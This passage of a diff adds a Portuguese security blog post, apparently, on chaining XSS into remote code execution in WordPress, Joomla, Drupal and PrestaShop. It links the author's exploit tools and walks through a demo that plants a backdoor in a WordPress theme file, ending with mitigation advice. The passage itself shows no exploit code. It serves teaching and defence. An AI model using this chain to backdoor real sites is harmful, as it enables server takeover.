+                <li><b>(RCE)</b> - <i>Built-In Theme’s Edit</i>;</li>
+                <li><b>(RCE)</b> - <i>Plugin Upload - Upload your custom plugin (backdoor) to the application</i>;</li>
+                <li><b>(Custom)</b> - <i>Custom Exploits for Third-Party Plugins/Themes</i>.</li>
+            </ul>
+
+            <br>
+            <h2>Wordpress (WPXStrike) - <a
+                    href="https://github.com/nowak0x01/WPXStrike">https://github.com/nowak0x01/WPXStrike</a></h2>
+            <center>
+                <video width="1440" height="1024" controls>
+                    <source
+                        src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/011101110111000001111000011100110111010001110010011010010110101101100101.mp4"
+                        type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </center>
+
+            <br><br>
+
+            <h2>Joomla (JoomSploit) - <a
+                    href="https://github.com/nowak0x01/JoomSploit">https://github.com/nowak0x01/JoomSploit</a></h2>
+            <center>
+                <video width="1440" height="1024" controls>
+                    <source
+                        src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/01101010011011110110111101101101011100110111000001101100011011110110100101110100.mp4"
+                        type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </center>
+
+            <br><br>
+
+            <h2>Drupal (Drupalwned) - <a
+                    href="https://github.com/nowak0x01/Drupalwned">https://github.com/nowak0x01/Drupalwned</a></h2>
+            <center>
+                <video width="1440" height="1024" controls>
+                    <source
+                        src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/01100100011100100111010101110000011000010110110001110111011011100110010101100100.mp4"
+                        type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </center>
+
+            <br><br>
+
+            <h2>PrestaShop (PrestaXSRF) - <a
+                    href="https://github.com/nowak0x01/PrestaXSRF">https://github.com/nowak0x01/PrestaXSRF</a></h2>
+            <center>
+                <video width="1440" height="1024" controls>
+                    <source
+                        src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/01110000011100100110010101110011011101000110000101110011011010000110111101110000.mp4"
+                        type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </center>
+
+            <br><br>
+
+            Para a demonstração, vamos utilizar o <b>WPXStrike</b>, juntamente com o módulo de edição de temas
+            <i>built-in</i> do
+            <b>WordPress</b>. Caso queira entender como a ferramenta funciona, veja os exemplos disponibilizados no
+            <b>GitHub</b>.
+
+            <br><br>
+            <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110110.png" width="1500"></center>
+            <br><br>
+
+            Trecho de código do exploit do tema <b>"TwentyTwentyThree()"</b>.
+
+            <br><br>
+            <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110111.png"></center>
+            <br><br>
+
+            Como podemos observar, o arquivo <b>"patterns/hidden-404.php"</b> do tema <b>"Twenty Twenty-Three"</b> do
+            <b>WordPress</b> não
+            apresenta nenhuma alteração ou código malicioso. No entanto, após a execução do nosso exploit, nosso
+            <i>backdoor</i>
+            será implantado neste arquivo.
+
+            <br><br>
+            <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000111000.png"></center>
+            <br><br>
+
+            Após um usuário com sessão administrativa no <b>Wordpress</b> acessa nossa <b>URL</b> vulnerável a
+            <b>XSS</b>,
+            que está importando
+            nosso exploit, nossa cadeia de ataque é executada. Isso resulta na realização das requisições necessárias
+            para
+            editar o tema escolhido, no caso o <b>"Twenty Twenty-Three"</b>, adicionando nosso <i>backdoor</i> ao
+            código.
+
+            <br><br>
+            <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000111001.png" width="1500"></center>
+            <br><br>
+
+            Resposta recebida em nosso servidor <b>Burp Collaborator</b>, confirmando a execução bem-sucedida do nosso
+            exploit.
+
+            <br><br>
+            <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001100110000.png" width="1500"></center>
+            <br><br>
+
+            Backdoor inserido no código-fonte do tema <b>"Twenty Twenty-Three"</b>.
+
+            <br><br>
+            <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001100110001.png"></center>
+            <br><br>
+
+            Obtendo <b>Execução Remota de Códigos (RCE)</b> no servidor através do nosso <i>backdoor</i>.
+
+            <br><br>
+            <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001100110010.png" width="1500"></center>
+            <br><br>
+
+            Como vimos, obter <b>Execução Remota de Código (RCE)</b> através de um <b>XSS</b> não é uma tarefa tão
+            difícil quanto
+            parece, embora demande tempo e trabalho. Espero que tenha gostado desse <b>POST</b> e compreendido a lógica
+            por
+            trás da técnica, a cadeia de ataques e como utilizar essa metodologia para criar novos exploits em
+            diferentes serviços. Agradeço se você leu até aqui. Desejo a você uma excelente semana e bons estudos.
+
+            <br><br><br>
+            <h2>Como previnir minhas aplicações contra esse tipo de exploração?</h2>
+            <ul>
+                <li><b>Desativar funcionalidades administrativas</b>: Desabilite o acesso ao gerenciamento de recursos
+                    através do painel de administração, preferindo a gestão exclusiva dessas funcionalidades via
+                    Interface
+                    de <b>Linha de Comando (CLI)</b> no servidor local.</li>
+                <li><b>Exemplo de Mitigação no WordPress</b>: É possível desabilitar as funcionalidades de editar,
+                    remover e
+                    adicionar plugins e temas no <b>Wordpress</b> adicionando o seguinte trecho de código ao arquivo
+                    <b>"wp-config.php"</b>:
+                    <pre><code>define('DISALLOW_FILE_MODS', true);</code></pre>
+                </li>
+                <li><b>Contas com privilégios administrativos</b>: Evite o uso de contas com privilégios administrativos
+                    em
+                    tarefas do dia a dia.</li>
+                <li><b>Utilização de CAPTCHA</b>: Implemente sistemas de <b>CAPTCHA</b> que exijam interações
+                    específicas via
+                    interface gráfica, como a seleção de imagens, a resolução de quebra-cabeças ou a entrada de texto
+                    específico.</li>
+            </ul>
+    </div>
+    <br><br>
+    <center><a href="/">Back to Home</a></center>
+</body>
+
+</html>
